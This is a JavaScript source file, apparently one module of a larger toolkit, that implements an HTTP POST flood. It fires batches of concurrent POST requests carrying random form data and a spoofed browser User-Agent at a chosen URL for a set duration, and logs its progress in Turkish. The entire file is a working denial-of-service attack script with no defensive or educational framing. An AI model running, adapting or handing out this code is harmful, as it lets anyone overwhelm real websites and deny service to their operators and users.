// post_flood_advanced.js
const url = new URL(params.url);
const client = url.protocol === 'https:' ? https : http;
const end = Date.now() + ((params.duration || 10) * 1000);

function generateRandomData() {
    const fields = params.fields || 5;
    let data = '';
    for (let i = 0; i < fields; i++) {
        data += `field${i}=${Math.random().toString(36).substring(7)}&`;
    }
    return data.slice(0, -1);
}

function sendPostRequest(postData) {
    return new Promise((resolve) => {
        const options = {
            method: 'POST',
            headers: {
                'Content-Type': params.contentType || 'application/x-www-form-urlencoded',
                'Content-Length': Buffer.byteLength(postData),
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
        };
        
        const req = client.request(url, options, (res) => {
            res.on('data', () => {});
            res.on('end', resolve);
        });
        
        req.on('error', () => resolve());
        req.write(postData);
        req.end();
    });
}

async function flood() {
    console.log(`[+] POST Flood başladı: ${params.url}`);
    
    let requestCount = 0;
    while (Date.now() < end) {
        const promises = [];
        const batchSize = params.requests || 100;
        
        for (let i = 0; i < batchSize; i++) {
            // Her istek için random data
            const postData = params.random ? generateRandomData() : (params.data || 'test=123');
            promises.push(sendPostRequest(postData));
        }
        
        await Promise.all(promises);
        requestCount += batchSize;
        
        if (requestCount % 1000 === 0) {
            console.log(`[+] ${requestCount} POST isteği gönderildi...`);
        }
    }
    
    console.log(`[+] POST Flood bitti! Toplam: ${requestCount} istek`);
}

flood();
